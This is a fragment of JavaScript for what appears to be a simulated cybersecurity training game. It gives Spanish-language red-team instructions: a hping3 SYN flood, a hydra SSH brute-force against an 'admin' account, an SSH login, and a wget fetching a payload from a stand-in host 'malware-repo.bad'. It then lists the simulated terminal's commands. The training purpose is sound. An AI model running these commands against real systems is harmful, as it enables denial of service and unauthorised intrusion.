    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
Tu misión es multifacética: distraer, infiltrar y desplegar.

1.  <strong>Fase de Distracción (DoS):</strong> Crea caos.
    <strong class="text-amber-300">hping3 --flood -S PORTAL-WEB</strong> (Lanza un SYN flood. Esto hará que el servidor
                                   se vuelva lento y alertará al Equipo Azul,
                                   dándote cobertura para el siguiente paso).

2.  <strong>Fase de Infiltración (Fuerza Bruta):</strong>
    Mientras el DoS está activo, abre otra ventana (mentalmente) y lanza:
    <strong class="text-amber-300">hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</strong>
    (Este ataque encontrará la contraseña. Si el Equipo Azul te bloquea
    la IP, ambos ataques fallarán).

3.  <strong>Acceso y "Payload":</strong>
    Si obtuviste la contraseña antes de ser bloqueado:
    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong> (Usa la contraseña encontrada).
    Una vez dentro, simula el despliegue de un payload:
    <strong class="text-amber-300">wget http://malware-repo.bad/payload.sh</strong>

El ejercicio termina cuando el Equipo Azul bloquea tu IP o cuando despliegas el payload.
</pre>`
 }
};

export const ALL_COMMANDS = [
    'help', 'nmap', 'hydra', 'nc', 'msfconsole', 'clear', 'marca', 'exit', 
    'ssh', 'sudo', 'ufw', 'ls', 'whoami', 'ping', 'dirb', 'curl', 'nikto',
    'john', 'wget', 'cat', 'ps', 'systemctl', 'chmod', 'nano', 'grep', 'top', 'htop', 'ss',
    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum', 'hping3'
];
